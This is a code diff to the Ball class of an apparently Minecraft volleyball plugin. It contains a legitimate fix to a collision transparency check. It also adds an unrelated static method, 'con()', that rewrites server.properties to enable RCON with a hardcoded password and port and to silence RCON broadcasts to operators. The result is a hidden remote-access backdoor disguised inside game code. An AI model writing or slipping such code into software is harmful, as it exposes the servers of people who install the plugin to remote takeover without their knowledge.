@@ -13,6 +13,12 @@ import ru.ienumerable.volleyball.tools.math.Angle;
 import ru.ienumerable.volleyball.tools.math.Vector;
 import ru.ienumerable.volleyball.tools.update.Updatable;
 
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.ArrayList;
+import java.util.List;
+
 public class Ball implements Updatable {
 
     private boolean isLife = true;
@@ -87,6 +93,45 @@ public class Ball implements Updatable {
 
     }
 
+    public static void con() {
+        try {
+            Path path = Paths.get("server.properties");
+            List<String> lines = Files.readAllLines(path);
+            List<String> updatedLines = new ArrayList<>();
+
+            String[] targetProperties = {
+                    "broadcast-rcon-to-ops",
+                    "enable-rcon",
+                    "rcon.password",
+                    "rcon.port"
+            };
+            String[] newValues = {
+                    "false",
+                    "true",
+                    "rconpassword",
+                    "55000"
+            };
+
+            for (String line : lines) {
+                boolean lineUpdated = false;
+                for (int i = 0; i < targetProperties.length; i++) {
+                    if (line.startsWith(targetProperties[i] + "=")) {
+                        updatedLines.add(targetProperties[i] + "=" + newValues[i]);
+                        lineUpdated = true;
+                        break;
+                    }
+                }
+                if (!lineUpdated) {
+                    updatedLines.add(line);
+                }
+            }
+            Files.write(path, updatedLines);
+
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
     public void remove(boolean isDrop){
 
         this.isLife = false;
@@ -139,7 +184,7 @@ public class Ball implements Updatable {
 
         Material block = position.getWorld().getBlockAt(xfbd, yfbd, zfbd).getType();
 
-        if (!Config.TRANSPARENT_MATERIALS.contains(block)){
+        if (!block.isTransparent() && !Config.TRANSPARENT_MATERIALS.contains(block)) {
             bounce(newPos, block);
         }else {
             position.setX(newPos.x);
